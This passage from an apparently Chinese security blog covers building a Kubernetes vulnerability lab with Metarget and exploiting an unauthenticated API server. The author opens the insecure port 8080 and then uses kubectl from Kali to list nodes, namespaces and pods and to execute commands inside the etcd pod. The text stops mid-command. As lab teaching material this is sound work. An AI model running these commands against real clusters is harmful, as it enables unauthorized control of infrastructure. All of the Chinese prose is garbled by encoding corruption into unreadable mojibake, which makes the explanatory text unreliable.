ã€é€€å‡ºä»£ç ä»¥åŠå®¹å™¨æ‰§è¡ŒæœŸé—´çš„èµ·æ­¢æ—¶é—´</p><p><strong>ç¬¬äºŒé˜¶æ®µ</strong>ï¼š<br><strong>Unschedulable</strong>ï¼šPodä¸èƒ½è¢«è°ƒåº¦ï¼Œ scheduleræ²¡æœ‰åŒ¹é…åˆ°åˆé€‚çš„nodeèŠ‚ç‚¹<br><strong>PodScheduled</strong>ï¼špodæ­£å¤„äºè°ƒåº¦ä¸­ï¼Œåœ¨scheduleråˆšå¼€å§‹è°ƒåº¦çš„æ—¶å€™ï¼Œè¿˜æ²¡æœ‰å°†podåˆ†é…åˆ°æŒ‡å®šçš„nodeï¼Œåœ¨ç­›é€‰å‡ºåˆé€‚çš„èŠ‚ç‚¹åå°±ä¼šæ›´æ–°etcdæ•°æ®ï¼Œå°†podåˆ†é…åˆ°æŒ‡å®šçš„node<br><strong>Initialized</strong>ï¼šæ‰€æœ‰podä¸­çš„åˆå§‹åŒ–å®¹å™¨å·²ç»å®Œæˆäº†<br><strong>ImagePullBackOff</strong>ï¼šPodæ‰€åœ¨çš„nodeèŠ‚ç‚¹ä¸‹è½½é•œåƒå¤±è´¥<br><strong>Running</strong>ï¼šPodå†…éƒ¨çš„å®¹å™¨å·²ç»è¢«åˆ›å»ºå¹¶ä¸”å¯åŠ¨ã€‚</p><p>æ‰©å±•ï¼šè¿˜æœ‰å…¶ä»–çŠ¶æ€ï¼Œå¦‚ä¸‹ï¼š<br><strong>Evicted</strong>çŠ¶æ€ï¼šå‡ºç°è¿™ç§æƒ…å†µï¼Œå¤šè§äºç³»ç»Ÿå†…å­˜æˆ–ç¡¬ç›˜èµ„æºä¸è¶³ï¼Œå¯df-hæŸ¥çœ‹dockerå­˜å‚¨æ‰€åœ¨ç›®å½•çš„èµ„æºä½¿ç”¨æƒ…å†µï¼Œå¦‚æœç™¾åˆ†æ¯”å¤§äº85%ï¼Œå°±è¦åŠæ—¶æ¸…ç†ä¸‹èµ„æºï¼Œå°¤å…¶æ˜¯ä¸€äº›å¤§æ–‡ä»¶ã€dockeré•œåƒã€‚<br><strong>CrashLoopBackOff</strong>ï¼šå®¹å™¨æ›¾ç»å¯åŠ¨äº†ï¼Œä½†å¯èƒ½åˆå¼‚å¸¸é€€å‡ºäº†</p><h4 id="k8s-æ¼æ´ç¯å¢ƒæ­å»º"><a href="#k8s-æ¼æ´ç¯å¢ƒæ­å»º" class="headerlink" title="k8s-æ¼æ´ç¯å¢ƒæ­å»º"></a>k8s-æ¼æ´ç¯å¢ƒæ­å»º</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#éº»çœç†å·¥å¤§å­¦ubuntu20 æº</span></span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.mit.edu/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.mit.edu/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><h5 id="å¼€æºé¡¹ç›®metarget"><a href="#å¼€æºé¡¹ç›®metarget" class="headerlink" title="å¼€æºé¡¹ç›®metarget"></a>å¼€æºé¡¹ç›®<a href="https://github.com/Metarget/metarget">metarget</a></h5><p>åœ¨ç ”ç©¶æ¼æ´æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šå‘ç°â€œç¯å¢ƒæ­å»ºâ€è¿™ä¸€æ­¥éª¤æœ¬èº«å°±ä¼šå ç”¨å¤§é‡çš„æ—¶é—´ï¼Œä¸ä¹‹ç›¸æ¯”ï¼ŒçœŸæ­£æµ‹è¯•PoCã€ExPçš„æ—¶é—´å¯èƒ½éå¸¸çŸ­ã€‚ç”±äºè®¸å¤šå®˜æ–¹é•œåƒåœ¨å›½å†…çš„ç½‘ç»œç¯å¢ƒä¸‹å¹¶ä¸æ–¹ä¾¿è·å¾—ï¼ŒåŠ ä¸Šäº‘åŸç”Ÿç»„ä»¶è‡ªèº«çš„å¤æ‚æ€§ï¼Œåœ¨äº‘åŸç”Ÿå®‰å…¨é¢†åŸŸï¼Œå‰è¿°é—®é¢˜å°¤ä¸ºæ˜æ˜¾ã€‚</p><p>ä¸æ­¤åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½çœ‹åˆ°ï¼Œå¼€æºç¤¾åŒºæ¶Œç°å‡ºä¸€äº›ä¼˜ç§€çš„å®‰å…¨é¡¹ç›®ï¼Œå¦‚<a href="https://github.com/vulhub/vulhub">Vulhub</a>ã€<a href="https://github.com/Medicean/VulApps">VulApps</a>ç­‰ï¼Œå°†æ¼æ´åœºæ™¯æ‰“åŒ…æˆé•œåƒï¼Œæ–¹ä¾¿ç ”ç©¶äººå‘˜å¼€ç®±å³ç”¨ã€‚</p><p>ç„¶è€Œï¼Œè¿™äº›é¡¹ç›®ä¸»è¦é’ˆå¯¹åº”ç”¨ç¨‹åºæ¼æ´ã€‚é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦ç ”ç©¶çš„æ˜¯Dockerã€Kubernetesã€æ“ä½œç³»ç»Ÿå†…æ ¸ç­‰åº•å±‚åŸºç¡€è®¾æ–½è‡ªèº«çš„æ¼æ´å‘¢ï¼Ÿè¿™åˆå›åˆ°äº†å‰é¢çš„ç¯å¢ƒæ­å»ºé—®é¢˜ã€‚</p><p>æˆ‘ä»¬å¸Œæœ›Metargetèƒ½å¤Ÿåœ¨ä¸€å®šç¨‹åº¦ä¸Šè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè‡´åŠ›äºåº•å±‚åŸºç¡€è®¾æ–½çš„è„†å¼±åœºæ™¯è‡ªåŠ¨åŒ–æ„å»ºã€‚åœ¨æ­¤ä¹‹ä¸Šï¼Œæˆ‘ä»¬è¿˜å¸Œæœ›Metargetå®ç°å¯¹äº‘åŸç”Ÿç¯å¢ƒå¤šå±‚æ¬¡è„†å¼±åœºæ™¯çš„è‡ªåŠ¨åŒ–æ„å»ºã€‚</p><h6 id="å®‰è£…metarget"><a href="#å®‰è£…metarget" class="headerlink" title="å®‰è£…metarget"></a>å®‰è£…metarget</h6><p>å®˜æ–¹å·²ç»ç»™å¥½äº†å®‰è£…æ–¹å¼ï¼Œç®€å•æ“ä½œå³å¯ï¼Œå®‰è£…k8sä¹‹å‰è¦å…ˆå®‰è£…dockerï¼Œå‚»ç“œå¼æ“ä½œï¼Œä¸€é”®å®‰è£…ã€‚<br>è¿™é‡Œå®˜æ–¹æ¨èä½¿ç”¨ubuntu16æˆ–è€…18ï¼Œç¬”è€…åœ¨è¿™é‡Œæ¨èå¿…é¡»ç”¨ubuntu18ï¼Œå› ä¸ºç¬”è€…åœ¨ubuntu20ä¸Šç ”ç©¶äº†ä¸¤å¤©åˆ©ç”¨metargetå®‰è£…k8séƒ½æ²¡æœ‰æˆåŠŸï¼Œä¸­é—´ä¼šå‡ºç°å„ç§å„æ ·çš„é”™è¯¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å…‹éš†é¡¹ç›®</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Metarget/metarget.git</span><br><span class="line"><span class="built_in">cd</span> metaget/ </span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line"><span class="comment">#è¿™é‡Œå¦‚æœæ²¡æœ‰pip3  å…ˆapt install python3-pip</span></span><br><span class="line"><span class="comment">#å¥½åƒè¿˜è¦è£…ä¸€ä¸‹curl    apt install curl</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20231227212433818.png" alt="image-20231227212433818"></p><p>åœ¨å®‰è£…å®Œä¾èµ–åï¼Œè¦å…ˆå®‰è£…ä¸€ä¸ªdocker  ï¼Œä¸è®©ç›´æ¥è£…k8sæ˜¯ä¸è¡Œçš„ã€‚<br>ç”¨metarget è£…  å¾ˆç®€å•<code>./metarget gadget install docker --version 18.03.1</code><br><img src="/images/k8s/image-20231227212726975.png" alt="image-20231227212726975"></p><p>åœ¨è¿™å…¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åŠ å‚æ•°ï¼Œâ€“verboseæ˜¾ç¤ºè¯¦ç»†çš„å®‰è£…è¿‡ç¨‹ï¼Œæ–¹ä¾¿è°ƒè¯•åƒè¿™æ ·<code>./metarget gadget install docker --version 18.03.1 --verbose</code></p><h5 id="k8s-ä¸€äº›é‡è¦çš„å‘½ä»¤"><a href="#k8s-ä¸€äº›é‡è¦çš„å‘½ä»¤" class="headerlink" title="k8s ä¸€äº›é‡è¦çš„å‘½ä»¤"></a>k8s ä¸€äº›é‡è¦çš„å‘½ä»¤</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åœ¨æœ¬æœºä¸ŠæŸ¥çœ‹node</span></span><br><span class="line">kubectl get node</span><br><span class="line">root@bohemian:~<span class="comment"># kubectl get node</span></span><br><span class="line">NAME              STATUS   ROLES    AGE   VERSION</span><br><span class="line">racknerd-6d0a89   Ready    master   37h   v1.16.6-beta.0</span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥çœ‹namespace</span></span><br><span class="line">kubectl get namespace</span><br><span class="line">root@bohemian:~<span class="comment"># kubectl get namespace</span></span><br><span class="line">NAME                   STATUS   AGE</span><br><span class="line">default                Active   37h</span><br><span class="line">kube-node-lease        Active   37h</span><br><span class="line">kube-public            Active   37h</span><br><span class="line">kube-system            Active   37h</span><br><span class="line">kubernetes-dashboard   Active   95m</span><br><span class="line">metarget               Active   24h</span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥çœ‹æŸä¸ªnamespcaeä¸‹æœ‰é‚£äº›çš„pod</span></span><br><span class="line">kubectl get pods -n metarget</span><br><span class="line">root@bohemian:~<span class="comment"># kubectl get pods -n metarget</span></span><br><span class="line">NAME                                       READY   STATUS    RESTARTS   AGE</span><br><span class="line">dvwa-web-86b6ccdc69-7l6n4                  1/1     Running   0          24h</span><br><span class="line">thinkphp-5-0-23-rce-web-7bb696c45b-n52pb   1/1     Running   0          24h</span><br><span class="line"></span><br><span class="line"><span class="comment">#åœ¨æŸä¸ªpodä¸Šæ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">kubectl <span class="built_in">exec</span> -n metarget -it dvwa-web-86b6ccdc69-7l6n4  sh</span><br><span class="line">kubectl <span class="built_in">exec</span> -n metarget -it dvwa-web-86b6ccdc69-7l6n4  <span class="string">&quot;ls -al&quot;</span></span><br><span class="line">root@bohemian:~<span class="comment"># kubectl exec -n metarget -it dvwa-web-86b6ccdc69-7l6n4  sh</span></span><br><span class="line"><span class="comment"># php -v</span></span><br><span class="line">PHP 7.0.30-0+deb9u1 (cli) (built: Jun 14 2018 13:50:25) ( NTS )</span><br><span class="line">Copyright (c) 1997-2017 The PHP Group</span><br><span class="line">Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.0.30-0+deb9u1, Copyright (c) 1999-2017, by Zend Technologies</span><br><span class="line"></span><br><span class="line">kubectl <span class="built_in">exec</span> -n kube-system -it kube-apiserver-racknerd-6d0a89 sh</span><br></pre></td></tr></table></figure><h5 id="Api-Server-æœªæˆæƒè®¿é—®ï¼ˆ8080å’Œ6443ï¼‰"><a href="#Api-Server-æœªæˆæƒè®¿é—®ï¼ˆ8080å’Œ6443ï¼‰" class="headerlink" title="Api Server æœªæˆæƒè®¿é—®ï¼ˆ8080å’Œ6443ï¼‰"></a>Api Server æœªæˆæƒè®¿é—®ï¼ˆ8080å’Œ6443ï¼‰</h5><p>ä½¿ç”¨metarget å®‰è£…k8s</p><p><code>./metarget gadget install k8s --version=1.16.5</code></p><p>è¿™ä¸ªæ—¶å€™ä¼šå‡ºç°å®‰è£…æˆåŠŸï¼Œå®‰è£…æˆåŠŸåï¼Œå°±ä¼šé»˜è®¤çš„å¯åŠ¨å¾ˆå¤šçš„POD<br><img src="/images/k8s/image-20231228090220104.png" alt="image-20231228090220104"></p><p>ç›¸åº”çš„ä½¿ç”¨<code>netstat -tulnp</code>ä¼šæ˜¾ç¤ºæ˜ å°„äº†å¾ˆå¤šç«¯å£</p><p><img src="/images/k8s/image-20231228090418847.png" alt="image-20231228090418847"></p><p>é»˜è®¤æƒ…å†µï¼ŒKubernetes API Serveræä¾›HTTPçš„ä¸¤ä¸ªç«¯å£ï¼š8080ï¼Œ6443</p><p>insecure-portï¼š é»˜è®¤ç«¯å£8080ï¼Œåœ¨HTTPä¸­æ²¡æœ‰è®¤è¯å’Œæˆæƒæ£€æŸ¥ã€‚<br>secure-port ï¼šé»˜è®¤ç«¯å£6443ï¼Œ è®¤è¯æ–¹å¼ï¼Œä»¤ç‰Œæ–‡ä»¶æˆ–è€…å®¢æˆ·ç«¯è¯ä¹¦.</p><p>insecure-port é»˜è®¤åœ¨é«˜ç‰ˆæœ¬ä¸­æ˜¯ä¸ä¼šæ‰“å¼€çš„ï¼Œsecure-port é»˜è®¤æ˜¯ä¼šæ‰“å¼€çš„ï¼Œä½†æ˜¯è®¿é—®æ—¶å­˜åœ¨é‰´æƒ</p><p><a href="https://ip:6443/">https://ip:6443/</a> è®¿é—®è¿™ä¸ª6443ç«¯å£æ—¶ï¼Œå¦‚ä¸‹å›¾403<img src="/images/k8s/image-20231228090722306.png" alt="image-20231228090722306"></p><h6 id="8080ç«¯å£æœªæˆæƒ"><a href="#8080ç«¯å£æœªæˆæƒ" class="headerlink" title="8080ç«¯å£æœªæˆæƒ"></a>8080ç«¯å£æœªæˆæƒ</h6><p>cat /etc/kubernetes/manifests/kube-apiserver.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">component:</span> <span class="string">kube-apiserver</span></span><br><span class="line">    <span class="attr">tier:</span> <span class="string">control-plane</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-apiserver</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">command:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">kube-apiserver</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--advertise-address=ip</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--allow-privileged=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--authorization-mode=Node,RBAC</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--client-ca-file=/etc/kubernetes/pki/ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--enable-admission-plugins=NodeRestriction</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--enable-bootstrap-token-auth=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-servers=https://127.0.0.1:2379</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--insecure-port=0</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-allowed-names=front-proxy-client</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-extra-headers-prefix=X-Remote-Extra-</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-group-headers=X-Remote-Group</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-username-headers=X-Remote-User</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--secure-port=6443</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--service-account-key-file=/etc/kubernetes/pki/sa.pub</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--service-cluster-ip-range=10.96.0.0/12</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--tls-cert-file=/etc/kubernetes/pki/apiserver.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--tls-private-key-file=/etc/kubernetes/pki/apiserver.key</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">k8s.gcr.io/kube-apiserver:v1.16.5</span></span><br><span class="line">    <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">failureThreshold:</span> <span class="number">8</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">host:</span> <span class="string">ip</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/healthz</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">6443</span></span><br><span class="line">        <span class="attr">scheme:</span> <span class="string">HTTPS</span></span><br><span class="line">      <span class="attr">initialDelaySeconds:</span> <span class="number">15</span></span><br><span class="line">      <span class="attr">timeoutSeconds:</span> <span class="number">15</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">kube-apiserver</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="attr">requests:</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">250m</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/etc/ssl/certs</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">ca-certs</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/etc/ca-certificates</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">etc-ca-certificates</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/etc/kubernetes/pki</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">k8s-certs</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/usr/local/share/ca-certificates</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">usr-local-share-ca-certificates</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/usr/share/ca-certificates</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">usr-share-ca-certificates</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">priorityClassName:</span> <span class="string">system-cluster-critical</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/etc/ssl/certs</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ca-certs</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/etc/ca-certificates</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">etc-ca-certificates</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/etc/kubernetes/pki</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">k8s-certs</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/usr/local/share/ca-certificates</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">usr-local-share-ca-certificates</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/usr/share/ca-certificates</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">usr-share-ca-certificates</span></span><br><span class="line"><span class="attr">status:</span> &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åå¯ä»¥æŸ¥çœ‹ä¸€äº›é…ç½®å‚æ•°ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ä¼šè¢«å®æ—¶è¯»å–çš„ï¼Œæ”¹è¿‡é…ç½®æ–‡ä»¶åï¼Œä¸éœ€è¦é‡å¯æœåŠ¡</p><p>å…¶ä¸­æœªæˆæƒç«¯å£å°±æ˜¯insecure-portç«¯å£è®¾ç½®ï¼Œ<code>    - --insecure-port=0</code>çœ‹äº†å¾ˆå¤šæ–‡ç« å¹¶æ²¡è¯´é‚£ä¸ªç‰ˆæœ¬ä»¥å‰ä¼šé»˜è®¤å¼€å¯ï¼Œåªè¯´äº†1.20ç‰ˆæœ¬åè¯¥é€‰é¡¹å·²æ— æ•ˆåŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ1.20ç‰ˆæœ¬åï¼Œè¯¥å‚æ•°ç›´æ¥æ²¡äº†ï¼Œå¦‚æœæƒ³å¯ç”¨ï¼Œéœ€è¦ç®¡ç†è€…æ‰‹åŠ¨æ·»åŠ ã€‚</p><p>æˆ‘ä»¬å°†è¿™é‡Œæ”¹ä¸º8080ï¼Œå¹¶ä¸”åŠ ä¸Šbind-addressï¼Œä¿å­˜å°±ä¼šçœ‹åˆ°å¼€å¯äº†8080ç«¯å£</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">--insecure-port=8080</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">--insecure-bind-address=0.0.0.0</span></span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20231228092959882.png" alt="image-20231228092959882"></p><p><img src="/images/k8s/image-20231228093032460.png" alt="image-20231228093032460"><br>è¿™é‡Œç¬”è€…ç”¨<a href="http://ip:8080/%E8%AE%BF%E9%97%AE%E6%88%90%E5%8A%9F">http://ip:8080/è®¿é—®æˆåŠŸ</a></p><p><img src="/images/k8s/image-20231228093318336.png" alt="image-20231228093318336"></p><p><a href="https://ip:8080/">https://ip:8080/</a>  httpsæ²¡æœ‰æˆåŠŸ</p><p>åœ¨å®æˆ˜ä¸­æ˜¾ç¤ºè¿™ä¸ªå¹¶ä¸ä¸€å®šèƒ½åˆ©ç”¨ï¼Œè¦æ˜¾ç¤ºå¾ˆé•¿è¿™ç§æ‰å¯èƒ½åˆ©ç”¨ã€‚</p><p><img src="/images/k8s/image-20231228112148534.png" alt="image-20231228112148534"></p><p>æ¥ä¸‹æ¥åˆ©ç”¨ï¼Œç›´æ¥åœ¨kaliä¸­å®‰è£…kubectl ï¼Œapt install kubectl å³å¯<br>æ‰§è¡Œå‘½ä»¤æŸ¥çœ‹nodeï¼Œ<br><code>kubectl -s ip:8080 get node</code></p><p><img src="/images/k8s/image-20231228093916392.png" alt="image-20231228093916392"></p><p>å³å¯çœ‹åˆ°æœåŠ¡å™¨ä¸Šçš„node</p><p><code>kubectl -s ip:8080 get namespace</code><br><img src="/images/k8s/image-20231228100247157.png" alt="image-20231228100247157"></p><p><code>kubectl -s ip:8080 get pods -n kube-system</code></p><p>åˆ—å‡ºæŸä¸ªnamespaceçš„pods</p><p><img src="/images/k8s/image-20231228100514838.png" alt="image-20231228100514838"></p><p><code>kubectl -s ip:8080 --namespace=kube-system exec -it etcd-racknerd-6d0a89 ip a</code></p><p>ä½¿ç”¨è¿™ä¸ªå‘½ä»¤å°±å¯ä»¥åœ¨æŸä¸ªpodä¸Šæ‰§è¡Œå‘½ä»¤äº†</p><p><img src="/images/k8s/image-20231228101628094.png" alt="image-20231228101628094"></p><p><img src="/images/k8s/image-20231228101658311.png" alt="image-20231228101658311"></p><p><code>kubectl -s ip:8080 --namespace=kube-system exec -it etcd-racknerd-6d0a89 